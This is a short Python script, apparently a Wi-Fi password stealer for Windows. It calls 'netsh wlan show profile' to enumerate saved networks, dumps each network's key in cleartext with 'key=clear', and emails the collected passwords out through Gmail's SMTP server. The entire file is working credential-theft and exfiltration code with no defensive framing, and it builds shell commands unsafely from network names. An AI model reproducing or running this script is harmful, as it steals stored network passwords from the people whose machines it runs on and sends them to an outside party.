import subprocess, smtplib, re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
finding_name = subprocess.check_output(command, shell=True)
network_lists = re.findall("(?:All\sUser\sProfile\s*:\s)(.*)", finding_name.decode())

result = ""
for network_name in network_lists:
    command = "netsh wlan show profile " + network_name + " key=clear"
    curr_result = subprocess.check_output(command, shell=True)
    result = result + str(curr_result)
send_mail("email", "password", result)
